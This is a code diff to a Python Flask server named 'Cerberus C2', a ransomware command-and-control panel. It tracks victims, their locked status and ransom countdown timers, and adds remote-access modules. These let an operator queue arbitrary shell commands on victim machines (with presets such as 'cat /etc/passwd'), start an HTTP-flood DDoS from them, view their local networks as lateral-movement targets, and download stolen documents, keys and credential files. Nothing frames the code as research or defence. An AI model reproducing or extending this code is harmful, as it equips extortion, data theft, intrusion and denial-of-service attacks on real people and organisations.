@@ -23,6 +23,18 @@ victims = {}
 # Structure: {'VICTIM_ID': {'files': ['/path/A', '/path/B'], 'command_queue': None, 'last_seen': str}}
 recon_data = {}
 
+# --- RAT Module Data Stores ---
+# Poltergeist: queued commands per victim {vid: [{"cmd": ..., "type": ...}, ...]}
+rat_commands = {}
+# Poltergeist: command output history {vid: [{"cmd": ..., "output": ..., "time": ...}, ...]}
+rat_output = {}
+# Cartographer: network scan results {vid: [{"ip": ..., "ports": [...], ...}, ...]}
+network_maps = {}
+# Data Thief: exfiltrated files {vid: [{"name": ..., "path": ..., "data_b64": ..., "size": ...}, ...]}
+exfil_store = {}
+# Zombie: DDoS state {vid: {"active": bool, "target": str}}
+ddos_state = {}
+
 # --- Cryptography Setup ---
 PRIVATE_KEY_FILE = "attacker_private_key.pem"
 PUBLIC_KEY_FILE = "attacker_public_key.pem"
@@ -69,112 +81,134 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    # Advanced Dashboard HTML
+    total_victims = len(victims)
+    locked_count = sum(1 for v in victims.values() if v['status'] == 'UNPAID')
+    waiting_count = len(recon_data)
+    exfil_count = sum(len(files) for files in exfil_store.values())
+    
     html = """
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>Cerberus C2 Command Center</title>
-        <meta http-equiv="refresh" content="5">
+        <title>Cerberus C2 — Command Center</title>
+        <meta http-equiv="refresh" content="10">
         <style>
-            body { background-color: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
-            h1 { text-align: center; color: #ff3333; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 30px; text-shadow: 0 0 10px #ff0000; }
-            .container { max-width: 1200px; margin: 0 auto; }
-            table { width: 100%; border-collapse: collapse; background-color: #1a1a1a; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-            th, td { padding: 15px; text-align: left; border-bottom: 1px solid #333; }
-            th { background-color: #252525; color: #ff3333; font-weight: bold; text-transform: uppercase; }
-            tr:hover { background-color: #222; }
-            .btn { display: inline-block; padding: 6px 12px; margin: 2px; border-radius: 4px; text-decoration: none; font-size: 12px; font-weight: bold; transition: all 0.2s; border: none; cursor: pointer; }
-            .btn-pay { background-color: #28a745; color: white; }
-            .btn-pay:hover { background-color: #218838; box-shadow: 0 0 8px #28a745; }
-            .btn-time { background-color: #007bff; color: white; }
-            .btn-time:hover { background-color: #0056b3; }
-            .btn-doom { background-color: #dc3545; color: white; }
-            .btn-doom:hover { background-color: #c82333; box-shadow: 0 0 10px #dc3545; }
-            .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
-            .status-unpaid { background-color: #dc3545; color: white; }
-            .status-paid { background-color: #28a745; color: white; }
-            .timer { font-family: 'Courier New', monospace; font-size: 16px; color: #ffcc00; font-weight: bold; }
-            .id-col { font-family: monospace; color: #aaa; }
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }
+            .topbar { background: #161b22; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }
+            .topbar h1 { color: #ff4444; font-size: 22px; letter-spacing: 2px; }
+            .topbar h1 span { color: #666; font-size: 14px; font-weight: normal; margin-left: 10px; }
+            .topbar-links a { color: #58a6ff; text-decoration: none; margin-left: 20px; font-size: 13px; }
+            .topbar-links a:hover { color: #79c0ff; }
+            .stats { display: flex; gap: 15px; padding: 20px 30px; }
+            .stat-card { flex: 1; background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; }
+            .stat-card .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+            .stat-card .value { font-size: 28px; font-weight: bold; margin-top: 5px; }
+            .val-red { color: #ff4444; } .val-green { color: #3fb950; } .val-orange { color: #d29922; } .val-blue { color: #58a6ff; }
+            .alert-banner { margin: 0 30px 15px; padding: 12px 20px; background: linear-gradient(90deg, #9e3c11, #bd4e10); border-radius: 8px; display: flex; align-items: center; justify-content: space-between; animation: pulse 2s infinite; }
+            @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.8; } }
+            .alert-banner .text { color: white; font-weight: 600; }
+            .alert-banner a { background: white; color: #9e3c11; padding: 6px 16px; border-radius: 5px; text-decoration: none; font-weight: bold; font-size: 13px; }
+            .main { padding: 10px 30px 30px; }
+            .section-title { color: #c9d1d9; font-size: 16px; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid #21262d; }
+            .victim-grid { display: flex; flex-direction: column; gap: 12px; }
+            .victim-card { background: #161b22; border: 1px solid #21262d; border-radius: 10px; padding: 20px; display: grid; grid-template-columns: 2fr 1fr 1fr 2fr 2fr; gap: 15px; align-items: center; transition: border-color 0.2s; }
+            .victim-card:hover { border-color: #388bfd; }
+            .v-id { font-family: 'Courier New', monospace; color: #58a6ff; font-size: 14px; }
+            .v-id a { color: #58a6ff; text-decoration: none; } .v-id a:hover { text-decoration: underline; }
+            .v-ip { color: #8b949e; font-size: 13px; margin-top: 4px; }
+            .badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+            .badge-locked { background: rgba(255,68,68,0.15); color: #ff4444; border: 1px solid rgba(255,68,68,0.3); }
+            .badge-decrypting { background: rgba(63,185,80,0.15); color: #3fb950; border: 1px solid rgba(63,185,80,0.3); }
+            .badge-other { background: rgba(210,153,34,0.15); color: #d29922; border: 1px solid rgba(210,153,34,0.3); }
+            .timer-display { font-family: 'Courier New', monospace; font-size: 20px; color: #ffcc00; font-weight: bold; }
+            .controls, .module-links { display: flex; flex-wrap: wrap; gap: 5px; }
+            .btn { display: inline-block; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 600; color: white; transition: all 0.15s; }
+            .btn-green { background: #238636; } .btn-green:hover { background: #2ea043; }
+            .btn-blue { background: #1f6feb; } .btn-blue:hover { background: #388bfd; }
+            .btn-red { background: #da3633; } .btn-red:hover { background: #f85149; }
+            .btn-purple { background: #8957e5; } .btn-purple:hover { background: #a371f7; }
+            .btn-teal { background: #1a7f6d; } .btn-teal:hover { background: #26a699; }
+            .btn-orange { background: #bd4e10; } .btn-orange:hover { background: #db6d28; }
+            .empty-state { text-align: center; padding: 40px; color: #484f58; }
+            .footer { padding: 20px 30px; text-align: center; color: #484f58; font-size: 12px; border-top: 1px solid #21262d; margin-top: 20px; }
         </style>
     </head>
     <body>
-        <div class="container">
-            <h1>Cerberus Ransomware C2</h1>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Victim ID</th>
-                        <th>IP Address</th>
-                        <th>Status</th>
-                        <th>Time Remaining</th>
-                        <th>Controls</th>
-                    </tr>
-                </thead>
-                <tbody>
-    """
-    
-    for vid, data in victims.items():
-        # Timer Formatting
-        seconds = data.get('timer', 72*3600)
-        m, s = divmod(seconds, 60)
-        h, m = divmod(m, 60)
-        timer_str = f"{h:02d}:{m:02d}:{s:02d}"
-        
-        status_html = ""
-        if data['status'] == 'UNPAID':
-             status_html = '<span class="status-badge status-unpaid">LOCKED</span>'
-        elif data['status'] == 'KEY_SENT':
-             status_html = '<span class="status-badge status-paid">DECRYPTING</span>'
-        else:
-             status_html = f'<span class="status-badge">{data["status"]}</span>'
-
-        html += f"""
-                    <tr>
-                        <td class="id-col"><a href="/victim/{vid}" style="color: #00ff00; text-decoration: none;">{vid}</a></td>
-                        <td class="id-col">{data.get('ip', 'Unknown')}</td>
-                        <td>{status_html}</td>
-                        <td class="timer">{timer_str}</td>
-                        <td>
-                            <a href="/mark_paid/{vid}" class="btn btn-pay">RELEASE KEY</a>
-                            <br>
-                            <a href="/api/timer/{vid}/add_1h" class="btn btn-time">+1 H</a>
-                            <a href="/api/timer/{vid}/sub_1h" class="btn btn-time">-1 H</a>
-                            <a href="/api/timer/{vid}/doomsday" class="btn btn-doom">💀 DOOMSDAY</a>
-                        </td>
-                    </tr>
-        """
-    
-    html += """
-                </tbody>
-            </table>
-    """
-    
-    # Add PROMINENT notification if victims are waiting for target selection
-    if recon_data:
-        html += f"""
-            <div style="background: linear-gradient(90deg, #ff6600, #ff3300); padding: 15px; margin: 20px 0; border-radius: 8px; animation: pulse 1.5s infinite;">
-                <style>@keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.7; }} }}</style>
-                <h2 style="margin: 0; color: white; text-align: center;">
-                    ⚠️ {len(recon_data)} VICTIM(S) WAITING FOR TARGET SELECTION ⚠️
-                </h2>
-                <p style="margin: 10px 0 0 0; text-align: center; color: white;">
-                    <a href="/target_selection" style="color: #ffff00; font-size: 18px; font-weight: bold;">
-                        👉 CLICK HERE TO SELECT FOLDERS TO ENCRYPT 👈
-                    </a>
-                </p>
-            </div>
-        """
-    
-    html += """
-            <div style="text-align: center; margin-top: 20px; color: #555;">
-                <p>Server Online | Listening on Port 5000</p>
-                <p>Use 'DOOMSDAY' to set timer to 1 minute instant panic.</p>
-                <p><a href="/target_selection" style="color: #ff6600; font-weight: bold;">[🎯 TARGET SELECTION - SELECT FOLDERS TO ENCRYPT]</a></p>
-                <p><a href="/qr" target="_blank" style="color: #00ff00; font-weight: bold;">[GENERATE MOBILE QR CODE]</a></p>
+        <div class="topbar">
+            <h1>☠️ CERBERUS C2 <span>Command Center</span></h1>
+            <div class="topbar-links">
+                <a href="/target_selection">🎯 Target Selection</a>
+                <a href="/qr" target="_blank">📱 QR Code</a>
             </div>
         </div>
+    """
+    
+    html += f"""
+        <div class="stats">
+            <div class="stat-card"><div class="label">Total Victims</div><div class="value val-red">{total_victims}</div></div>
+            <div class="stat-card"><div class="label">Locked</div><div class="value val-orange">{locked_count}</div></div>
+            <div class="stat-card"><div class="label">Awaiting Selection</div><div class="value val-blue">{waiting_count}</div></div>
+            <div class="stat-card"><div class="label">Files Stolen</div><div class="value val-green">{exfil_count}</div></div>
+        </div>
+    """
+    
+    if recon_data:
+        html += f"""
+        <div class="alert-banner">
+            <span class="text">⚠️ {len(recon_data)} victim(s) waiting for target folder selection</span>
+            <a href="/target_selection">Select Targets →</a>
+        </div>
+        """
+    
+    html += '<div class="main"><h2 class="section-title">Active Victims</h2><div class="victim-grid">'
+    
+    if not victims:
+        html += '<div class="empty-state">No victims connected yet. Deploy the payload and wait...</div>'
+    
+    for vid, data in victims.items():
+        seconds = data.get('timer', 72*3600)
+        mn, sc = divmod(seconds, 60)
+        hr, mn = divmod(mn, 60)
+        timer_str = f"{hr:02d}:{mn:02d}:{sc:02d}"
+        
+        if data['status'] == 'UNPAID':
+            badge = '<span class="badge badge-locked">🔒 Locked</span>'
+        elif data['status'] == 'KEY_SENT':
+            badge = '<span class="badge badge-decrypting">🔓 Decrypting</span>'
+        else:
+            badge = f'<span class="badge badge-other">{data["status"]}</span>'
+        
+        exfil_file_count = len(exfil_store.get(vid, []))
+        net_host_count = len(network_maps.get(vid, []))
+        
+        html += f"""
+        <div class="victim-card">
+            <div>
+                <div class="v-id"><a href="/victim/{vid}">{vid}</a></div>
+                <div class="v-ip">📍 {data.get('ip', 'Unknown')}</div>
+            </div>
+            <div>{badge}</div>
+            <div class="timer-display">{timer_str}</div>
+            <div class="controls">
+                <a href="/mark_paid/{vid}" class="btn btn-green">🔑 Release Key</a>
+                <a href="/api/timer/{vid}/add_1h" class="btn btn-blue">+1h</a>
+                <a href="/api/timer/{vid}/sub_1h" class="btn btn-blue">-1h</a>
+                <a href="/api/timer/{vid}/doomsday" class="btn btn-red">💀 Doom</a>
+            </div>
+            <div class="module-links">
+                <a href="/rat_panel/{vid}" class="btn btn-purple">🎮 Remote Shell</a>
+                <a href="/network_map/{vid}" class="btn btn-teal">🗺️ Network ({net_host_count})</a>
+                <a href="/exfil/{vid}" class="btn btn-orange">📁 Files ({exfil_file_count})</a>
+            </div>
+        </div>
+        """
+    
+    html += """
+            </div>
+        </div>
+        <div class="footer">Cerberus C2 — Server Online | Port 5000</div>
     </body>
     </html>
     """
@@ -606,7 +640,7 @@ def send_command(vid):
             "targets": targets
         }
         print(f"[!] ENCRYPT command queued for {vid} - {len(targets)} folders selected")
-        return redirect(url_for('target_ui'))
+        return redirect(url_for('home'))
     return "Victim not found", 404
 
 @app.route('/mark_paid/<victim_id>', methods=['POST', 'GET'])
@@ -647,6 +681,377 @@ def mark_as_paid(victim_id):
         victims[victim_id]['status'] = 'ERROR'
 
     return redirect(url_for('home'))
+
+# --- RAT MODULE ENDPOINTS ---
+
+# Poltergeist: RAT Command System
+@app.route('/api/rat_command/<vid>', methods=['GET'])
+def get_rat_command(vid):
+    """Victim polls for RAT commands"""
+    if vid not in rat_commands:
+        rat_commands[vid] = []
+    
+    if rat_commands[vid]:
+        cmd = rat_commands[vid].pop(0)  # FIFO queue
+        return jsonify(cmd)
+    return jsonify({"type": "none"})
+
+@app.route('/api/rat_command/<vid>', methods=['POST'])
+def queue_rat_command(vid):
+    """Attacker queues a RAT command for victim"""
+    if vid not in rat_commands:
+        rat_commands[vid] = []
+    
+    cmd_data = request.json
+    rat_commands[vid].append(cmd_data)
+    print(f"[RAT] Command queued for {vid}: {cmd_data.get('type')}")
+    return jsonify({"status": "queued"})
+
+@app.route('/api/rat_output/<vid>', methods=['POST'])
+def receive_rat_output(vid):
+    """Victim sends command execution output"""
+    if vid not in rat_output:
+        rat_output[vid] = []
+    
+    data = request.json
+    data['time'] = datetime.datetime.now().strftime("%H:%M:%S")
+    rat_output[vid].append(data)
+    print(f"[RAT] Output from {vid}: {data.get('cmd', 'N/A')[:50]}")
+    return "OK", 200
+
+# Cartographer: Network Mapping
+@app.route('/api/network_map/<vid>', methods=['POST'])
+def receive_network_map(vid):
+    """Victim sends network scan results"""
+    network_maps[vid] = request.json.get('hosts', [])
+    print(f"[CARTOGRAPHER] {vid} mapped {len(network_maps[vid])} hosts")
+    return "OK", 200
+
+# Data Thief: File Exfiltration
+@app.route('/api/exfil/<vid>', methods=['POST'])
+def receive_exfil(vid):
+    """Victim uploads exfiltrated files"""
+    if vid not in exfil_store:
+        exfil_store[vid] = []
+    
+    file_data = request.json
+    exfil_store[vid].append(file_data)
+    print(f"[DATA THIEF] {vid} exfiltrated: {file_data.get('name')}")
+    return "OK", 200
+
+@app.route('/api/exfil/<vid>/download/<int:file_id>')
+def download_exfil(vid, file_id):
+    """Download exfiltrated file"""
+    if vid not in exfil_store or file_id >= len(exfil_store[vid]):
+        return "File not found", 404
+    
+    file_data = exfil_store[vid][file_id]
+    content = base64.b64decode(file_data['data_b64'])
+    
+    from io import BytesIO
+    buf = BytesIO(content)
+    buf.seek(0)
+    return send_file(buf, download_name=file_data['name'], as_attachment=True)
+
+# RAT Panel UI
+@app.route('/rat_panel/<vid>')
+def rat_panel(vid):
+    """Unified RAT control panel for a victim"""
+    if vid not in victims:
+        return "Victim not found", 404
+    
+    output_history = rat_output.get(vid, [])[-20:]
+    ddos_status = ddos_state.get(vid, {})
+    ddos_active = ddos_status.get('active', False)
+    ddos_target = ddos_status.get('target', '')
+    
+    # Build output HTML
+    output_html = ""
+    for out in reversed(output_history):
+        cmd_text = out.get("cmd", "N/A")[:80]
+        out_text = out.get("output", "").replace("<", "&lt;").replace(">", "&gt;")[:2000]
+        output_html += f'<div class="out-cmd"><span class="time">[{out.get("time", "?")}]</span> $ {cmd_text}</div>'
+        output_html += f'<pre class="out-result">{out_text}</pre>'
+    
+    if not output_history:
+        output_html = '<div style="color: #484f58; padding: 20px; text-align: center;">No commands executed yet. Type a command above and hit Execute.</div>'
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Remote Shell — {vid}</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
+            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
+            .topbar h1 {{ color: #a371f7; font-size: 18px; }}
+            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
+            .content {{ padding: 20px 25px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }}
+            .panel {{ background: #161b22; border: 1px solid #21262d; border-radius: 10px; padding: 20px; }}
+            .panel h2 {{ color: #c9d1d9; font-size: 15px; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #21262d; }}
+            .cmd-form {{ display: flex; gap: 8px; margin-bottom: 12px; }}
+            .cmd-form input {{ flex: 1; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 10px 14px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; }}
+            .cmd-form input:focus {{ outline: none; border-color: #58a6ff; }}
+            .cmd-form button {{ background: #8957e5; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
+            .cmd-form button:hover {{ background: #a371f7; }}
+            .quick-btns {{ display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 15px; }}
+            .quick-btn {{ background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 5px 12px; border-radius: 5px; text-decoration: none; font-size: 12px; font-family: monospace; cursor: pointer; }}
+            .quick-btn:hover {{ background: #30363d; border-color: #58a6ff; }}
+            .terminal {{ background: #010409; border: 1px solid #21262d; border-radius: 8px; max-height: 400px; overflow-y: auto; padding: 12px; }}
+            .out-cmd {{ color: #3fb950; font-family: 'Courier New', monospace; font-size: 13px; margin-top: 8px; }}
+            .out-cmd .time {{ color: #484f58; }}
+            .out-result {{ color: #8b949e; font-family: 'Courier New', monospace; font-size: 12px; margin: 4px 0 8px; padding: 0; white-space: pre-wrap; word-break: break-all; border-bottom: 1px solid #161b22; padding-bottom: 8px; }}
+            .ddos-status {{ display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }}
+            .dot {{ width: 10px; height: 10px; border-radius: 50%; display: inline-block; }}
+            .dot-red {{ background: #f85149; box-shadow: 0 0 6px #f85149; animation: blink 1s infinite; }}
+            .dot-green {{ background: #3fb950; }}
+            @keyframes blink {{ 0%,100% {{ opacity:1 }} 50% {{ opacity:0.3 }} }}
+            .ddos-form {{ display: flex; gap: 8px; }}
+            .ddos-form input {{ flex: 1; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 8px 12px; border-radius: 6px; }}
+            .btn-attack {{ background: #da3633; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
+            .btn-attack:hover {{ background: #f85149; }}
+            .btn-stop {{ background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
+            .btn-stop:hover {{ background: #2ea043; }}
+            .refresh-indicator {{ color: #484f58; font-size: 11px; margin-left: 10px; }}
+        </style>
+    </head>
+    <body>
+        <div class="topbar">
+            <h1>🎮 Remote Shell — {vid[:12]}...<span class="refresh-indicator" id="refresh-dot"></span></h1>
+            <div><a href="/">← Dashboard</a><a href="/victim/{vid}">Victim Details</a><a href="/network_map/{vid}">🗺️ Network</a><a href="/exfil/{vid}">📁 Files</a></div>
+        </div>
+        
+        <div class="content">
+            <div class="panel" style="grid-column: 1 / -1;">
+                <h2>💀 Remote Command Execution (Poltergeist)</h2>
+                <form class="cmd-form" action="/rat_panel/{vid}/exec" method="POST">
+                    <input type="text" name="cmd" id="cmd-input" placeholder="Enter shell command... (e.g. ls /home or cat /etc/passwd)" autocomplete="off" required>
+                    <button type="submit">Execute ▶</button>
+                </form>
+                <div class="quick-btns">
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="whoami"><button type="submit" class="quick-btn">whoami</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="id"><button type="submit" class="quick-btn">id</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="uname -a"><button type="submit" class="quick-btn">uname -a</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ps aux"><button type="submit" class="quick-btn">ps aux</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ls -la /home"><button type="submit" class="quick-btn">ls /home</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ifconfig"><button type="submit" class="quick-btn">ifconfig</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="netstat -tlnp"><button type="submit" class="quick-btn">netstat</button></form>
+                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="cat /etc/passwd"><button type="submit" class="quick-btn">cat /etc/passwd</button></form>
+                </div>
+                <div class="terminal" id="terminal-output">{output_html}</div>
+            </div>
+            
+            <div class="panel">
+                <h2>🧟 DDoS Bot (Zombie)</h2>
+                <div class="ddos-status">
+                    <span class="dot {'dot-red' if ddos_active else 'dot-green'}"></span>
+                    <span style="font-weight: 600;">{'🔴 ATTACKING' if ddos_active else '🟢 IDLE'}</span>
+                    {'<span style="color: #8b949e; margin-left: 10px;">Target: ' + ddos_target + '</span>' if ddos_target else ''}
+                </div>
+                <form class="ddos-form" action="/rat_panel/{vid}/ddos" method="POST">
+                    <input type="text" name="target" placeholder="http://target-website.com" value="{ddos_target}" required>
+                    <button type="submit" name="action" value="start" class="btn-attack">⚡ Attack</button>
+                    <button type="submit" name="action" value="stop" class="btn-stop">🛑 Stop</button>
+                </form>
+                <p style="color: #484f58; font-size: 11px; margin-top: 8px;">Spawns 5 threads flooding the target with HTTP requests.</p>
+            </div>
+            
+            <div class="panel">
+                <h2>ℹ️ About This Panel</h2>
+                <p style="color: #8b949e; font-size: 13px; line-height: 1.6;">
+                    <b>Remote Shell</b> — Execute any command on the victim's machine. Use <code style="color: #79c0ff;">cd /path && ls</code> to navigate + list, since each command runs in its own shell. Example: <code style="color: #79c0ff;">cd /home/user && ls -la</code><br><br>
+                    <b>DDoS Bot</b> — Turns the victim machine into a bot that floods a target website with requests. Use Start/Stop to control.
+                </p>
+            </div>
+        </div>
+        
+        <script>
+            // AJAX auto-refresh: Only updates the terminal output, NOT the input field
+            setInterval(function() {{
+                var dot = document.getElementById('refresh-dot');
+                dot.textContent = ' ⟳';
+                fetch(window.location.href)
+                    .then(r => r.text())
+                    .then(html => {{
+                        var parser = new DOMParser();
+                        var doc = parser.parseFromString(html, 'text/html');
+                        var newTerminal = doc.getElementById('terminal-output');
+                        if (newTerminal) {{
+                            document.getElementById('terminal-output').innerHTML = newTerminal.innerHTML;
+                        }}
+                        dot.textContent = '';
+                    }})
+                    .catch(function() {{ dot.textContent = ''; }});
+            }}, 5000);
+            
+            // Keep focus on input after page load
+            document.getElementById('cmd-input').focus();
+        </script>
+    </body>
+    </html>
+    """
+    return html
+
+@app.route('/rat_panel/<vid>/exec', methods=['POST'])
+def rat_exec(vid):
+    cmd = request.form.get('cmd')
+    if vid not in rat_commands:
+        rat_commands[vid] = []
+    rat_commands[vid].append({"type": "shell", "cmd": cmd})
+    return redirect(url_for('rat_panel', vid=vid))
+
+@app.route('/rat_panel/<vid>/ddos', methods=['POST'])
+def rat_ddos_control(vid):
+    action = request.form.get('action')
+    target = request.form.get('target')
+    if vid not in rat_commands:
+        rat_commands[vid] = []
+    if action == 'start':
+        rat_commands[vid].append({"type": "ddos_start", "target": target})
+        ddos_state[vid] = {"active": True, "target": target}
+    elif action == 'stop':
+        rat_commands[vid].append({"type": "ddos_stop"})
+        if vid in ddos_state:
+            ddos_state[vid]['active'] = False
+    return redirect(url_for('rat_panel', vid=vid))
+
+# Network Map UI
+@app.route('/network_map/<vid>')
+def show_network_map(vid):
+    hosts = network_maps.get(vid, [])
+    
+    # Port name lookup
+    port_names = {22: 'SSH', 80: 'HTTP', 443: 'HTTPS', 445: 'SMB', 3389: 'RDP'}
+    
+    host_rows = ""
+    for host in hosts:
+        ports = host.get('ports', [])
+        port_badges = ""
+        for p in ports:
+            name = port_names.get(p, str(p))
+            port_badges += f'<span style="background: #21262d; padding: 2px 8px; border-radius: 4px; font-size: 12px; margin: 2px;">{p} ({name})</span> '
+        host_rows += f'<tr><td style="color: #58a6ff; font-family: monospace;">{host.get("ip", "N/A")}</td><td>{port_badges}</td><td><span style="color: #3fb950;">● LIVE</span></td></tr>'
+    
+    if not hosts:
+        host_rows = '<tr><td colspan="3" style="text-align: center; color: #484f58; padding: 30px;">No hosts discovered. The victim\'s network may not have responded or scan is still running.</td></tr>'
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Network Map — {vid}</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
+            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
+            .topbar h1 {{ color: #26a699; font-size: 18px; }}
+            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
+            .content {{ padding: 20px 25px; }}
+            .info {{ background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; margin-bottom: 15px; }}
+            .info p {{ color: #8b949e; font-size: 13px; line-height: 1.6; }}
+            table {{ width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #21262d; border-radius: 8px; overflow: hidden; }}
+            th {{ background: #21262d; color: #c9d1d9; padding: 12px 15px; text-align: left; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }}
+            td {{ padding: 12px 15px; border-top: 1px solid #21262d; }}
+            tr:hover {{ background: #1c2128; }}
+            .legend {{ display: flex; gap: 15px; margin-top: 15px; }}
+            .legend span {{ color: #8b949e; font-size: 12px; }}
+        </style>
+    </head>
+    <body>
+        <div class="topbar">
+            <h1>🗺️ Network Map — {vid[:12]}...</h1>
+            <div><a href="/">← Dashboard</a><a href="/rat_panel/{vid}">🎮 Remote Shell</a><a href="/exfil/{vid}">📁 Files</a></div>
+        </div>
+        <div class="content">
+            <div class="info">
+                <p><b>What is this?</b> The Cartographer module scanned the victim's local network (same WiFi/LAN) to find other devices. These are potential lateral movement targets — other computers, servers, or IoT devices on the same network that could also be compromised.</p>
+                <p style="margin-top: 8px;"><b>Found {len(hosts)} device(s)</b> on the victim's network.</p>
+            </div>
+            <table>
+                <thead><tr><th>IP Address</th><th>Open Ports (Services)</th><th>Status</th></tr></thead>
+                <tbody>{host_rows}</tbody>
+            </table>
+            <div class="legend">
+                <span>SSH (22) = Remote Login</span>
+                <span>HTTP (80) = Web Server</span>
+                <span>HTTPS (443) = Secure Web</span>
+                <span>SMB (445) = File Sharing</span>
+                <span>RDP (3389) = Remote Desktop</span>
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+    return html
+
+# Exfiltration Data UI
+@app.route('/exfil/<vid>')
+def show_exfil(vid):
+    files = exfil_store.get(vid, [])
+    
+    # File type icons
+    ext_icons = {'.txt': '📄', '.pdf': '📕', '.doc': '📝', '.docx': '📝', '.xls': '📊', '.xlsx': '📊',
+                 '.csv': '📊', '.jpg': '🖼️', '.png': '🖼️', '.jpeg': '🖼️', '.json': '⚙️', '.xml': '⚙️',
+                 '.pem': '🔑', '.key': '🔑', '.env': '🔐', '.sql': '🗃️', '.db': '🗃️'}
+    
+    file_rows = ""
+    for idx, f in enumerate(files):
+        ext = os.path.splitext(f.get('name', ''))[1].lower()
+        icon = ext_icons.get(ext, '📎')
+        size_kb = f.get('size', 0) / 1024
+        file_rows += f"""
+        <tr>
+            <td>{icon} <b>{f.get('name', 'N/A')}</b></td>
+            <td style="color: #8b949e; font-size: 12px;">{f.get('path', 'N/A')}</td>
+            <td>{size_kb:.1f} KB</td>
+            <td><a href="/api/exfil/{vid}/download/{idx}" style="background: #238636; color: white; padding: 5px 12px; border-radius: 5px; text-decoration: none; font-size: 12px; font-weight: 600;">⬇️ Download</a></td>
+        </tr>"""
+    
+    if not files:
+        file_rows = '<tr><td colspan="4" style="text-align: center; color: #484f58; padding: 30px;">No files exfiltrated yet. The Data Thief module scans for documents, credentials, and config files on the victim machine.</td></tr>'
+    
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Stolen Files — {vid}</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
+            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
+            .topbar h1 {{ color: #db6d28; font-size: 18px; }}
+            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
+            .content {{ padding: 20px 25px; }}
+            .stat {{ background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; margin-bottom: 15px; display: flex; gap: 30px; }}
+            .stat div {{ text-align: center; }}
+            .stat .num {{ font-size: 24px; font-weight: bold; color: #db6d28; }}
+            .stat .lbl {{ color: #8b949e; font-size: 12px; }}
+            table {{ width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #21262d; border-radius: 8px; overflow: hidden; }}
+            th {{ background: #21262d; color: #c9d1d9; padding: 12px 15px; text-align: left; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }}
+            td {{ padding: 10px 15px; border-top: 1px solid #21262d; }}
